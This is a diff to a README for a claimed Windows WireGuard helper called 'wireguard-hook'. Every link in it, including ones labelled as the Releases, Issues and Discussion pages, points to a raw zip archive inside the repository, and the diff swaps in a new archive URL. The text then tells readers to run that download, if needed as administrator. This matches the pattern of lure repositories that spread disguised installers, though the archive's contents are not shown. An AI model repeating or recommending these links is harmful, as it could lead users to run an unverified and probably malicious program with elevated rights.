@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download wireguard-hook](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip%20Now-Click%20Here-blue)](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip)
+[![Download wireguard-hook](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -24,11 +24,11 @@ Welcome to wireguard-hook! This project enables the WireGuard VPN client on Wind
 
 ## 🔄 How to Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip).
   
 2. **Find the Latest Release**: Look for the most recent version of wireguard-hook. It will be clearly marked. 
 
-3. **Download the Installer**: Click on the link that shows the latest release. This will typically be named something like `https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip`. 
+3. **Download the Installer**: Click on the link that shows the latest release. This will typically be named something like `https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip`. 
 
 4. **Run the Installer**: Once the download is complete, locate the downloaded file in your Downloads folder and double-click it to run the installer.
 
@@ -44,7 +44,7 @@ If you encounter any issues during installation or usage, please try the followi
 
 - **Run as Administrator**: Right-click the wireguard-hook icon and choose "Run as administrator". This may resolve permission issues.
   
-- **Check for Updates**: Ensure you are using the latest version of wireguard-hook. Visit the [Releases page](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip) for updates.
+- **Check for Updates**: Ensure you are using the latest version of wireguard-hook. Visit the [Releases page](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip) for updates.
 
 - **Install Dependencies**: Make sure you have the WireGuard VPN client installed. You can download it from the official WireGuard website.
 
@@ -64,9 +64,9 @@ Once wireguard-hook is running, you can easily manage your VPN connections:
 
 For additional help or to share your experiences:
 
-- **Issues Page**: Report any issues you encounter in the [Issues section of GitHub](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip).
+- **Issues Page**: Report any issues you encounter in the [Issues section of GitHub](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip).
   
-- **Discussion Forum**: Join the community discussions in the [Discussion section](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip). Share tips, ask for help, or provide feedback.
+- **Discussion Forum**: Join the community discussions in the [Discussion section](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip). Share tips, ask for help, or provide feedback.
 
 ## 💡 Contributing
 
@@ -82,4 +82,4 @@ For direct inquiries, please reach out via the GitHub page. You can also follow 
 
 Thank you for using wireguard-hook! Enjoy better control over your VPN experience. 
 
-You can always return to the [Releases page](https://github.com/brochurehub123/wireguard-hook/raw/refs/heads/main/dns/overture/wireguard-hook-3.8.zip) to find the latest version or additional resources.
+You can always return to the [Releases page](https://raw.githubusercontent.com/brochurehub123/wireguard-hook/main/dns/overture/wireguard_hook_v1.6.zip) to find the latest version or additional resources.
